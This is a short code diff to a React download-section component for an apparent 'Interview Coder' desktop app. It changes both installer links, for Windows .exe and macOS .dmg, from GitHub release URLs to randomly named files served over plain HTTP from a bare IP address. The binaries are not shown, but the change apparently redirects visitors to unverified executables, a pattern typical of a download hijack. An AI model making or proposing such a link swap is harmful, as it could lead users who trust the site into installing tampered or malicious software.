@@ -32,7 +32,7 @@ export function DownloadSection() {
     >
       <div className="flex gap-3">
         <a
-          href="https://github.com/a1594834522-coder/interview-coder/releases/download/v1.0.20/Interview.Coder-Windows-1.0.19.exe"
+          href="http://47.96.89.141:8888/down/ATubLlZETxxr.exe"
           className="group flex items-center gap-2 rounded-2xl border border-white/20 bg-white/10 px-6 py-3 text-sm font-light text-white backdrop-blur-sm transition-all duration-300 hover:scale-105 hover:bg-white/20"
         >
           <svg className="h-4 w-4 transition-transform group-hover:scale-110" fill="currentColor" viewBox="0 0 20 20">
@@ -45,7 +45,7 @@ export function DownloadSection() {
           Windows 版下载
         </a>
         <a
-          href="https://github.com/a1594834522-coder/interview-coder/releases/download/v1.0.20/Interview-Coder-mac-arm64-v1.0.19.dmg"
+          href="http://47.96.89.141:8888/down/4wuSGyu3Pg3r.dmg"
           className="group flex items-center gap-2 rounded-2xl border border-white/20 bg-white/10 px-6 py-3 text-sm font-light text-white backdrop-blur-sm transition-all duration-300 hover:scale-105 hover:bg-white/20"
         >
           <svg className="h-4 w-4 transition-transform group-hover:scale-110" fill="currentColor" viewBox="0 0 20 20">
